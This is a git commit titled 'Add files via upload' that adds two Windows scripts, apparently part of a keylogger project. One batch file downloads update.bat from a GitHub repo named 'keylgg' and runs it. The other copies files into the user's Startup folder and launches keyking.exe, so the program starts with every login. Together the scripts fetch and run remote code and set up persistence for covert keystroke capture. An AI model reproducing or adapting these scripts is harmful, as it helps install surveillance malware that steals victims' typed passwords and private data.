357a0672deb1c5533eb6b54237a5eedc431a0216
fancode343 <118608942+fancode343@users.noreply.github.com>
2022-12-11 11:11:49 +0800

    Add files via upload

---
+++ KLLG/UPDT/1.bat
@@ -0,0 +1,2 @@
+curl https://raw.githubusercontent.com/fancode343/keylgg/main/update/update.bat -O
+update.bat
---
+++ startup.cmd
@@ -0,0 +1,2 @@
+xcopy startup "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /e
+C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keyking.exe
